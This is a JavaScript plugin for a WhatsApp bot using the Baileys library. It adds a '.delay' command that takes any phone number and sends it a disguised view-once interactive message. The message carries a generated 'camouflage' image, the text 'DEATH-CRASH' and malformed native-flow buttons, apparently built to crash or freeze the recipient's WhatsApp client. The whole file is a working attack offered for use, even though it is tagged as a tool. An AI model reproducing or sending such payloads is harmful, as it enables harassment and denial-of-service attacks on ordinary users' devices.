import { createCanvas } from 'canvas'
import { generateWAMessageFromContent } from '@whiskeysockets/baileys'

let handler = async (m, { conn, text, command }) => {
  if (!text) return m.reply(`📌 Usa così:\n.${command} numero\n\nEsempio:\n.${command} 393471234567`)

  let target = `${text.replace(/[^0-9]/g, '')}@s.whatsapp.net`

  try {
    // genera immagine camuffo
    const width = 800
    const height = 600
    const canvas = createCanvas(width, height)
    const ctx = canvas.getContext('2d')

    // sfondo nero
    ctx.fillStyle = '#000'
    ctx.fillRect(0, 0, width, height)

    // scritta rossa
    ctx.fillStyle = '#ff0000'
    ctx.font = 'bold 60px Arial'
    ctx.textAlign = 'center'
    ctx.fillText('MATTE DOMINA', width / 2, height / 2)

    const buffer = canvas.toBuffer()

    // messaggio camuffato
    let msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: true,
              imageMessage: (await conn.prepareMessage(target, { image: buffer }, { upload: conn.waUploadToServer })).message.imageMessage
            },
            body: {
              text: "𝐃𝐄𝐀𝐓𝐇-𝐂𝐑𝐀𝐒𝐇"
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z"
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }
              ]
            }
          }
        }
      }
    }, {})

    await conn.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    })

    m.reply(`✅ Foto camuffata inviata a ${text}`)
  } catch (e) {
    console.error(e)
    m.reply("❌ Errore durante l'invio")
  }
}

handler.command = /^delay$/i
handler.help = ['delay <numero>']
handler.tags = ['tools']

export default handler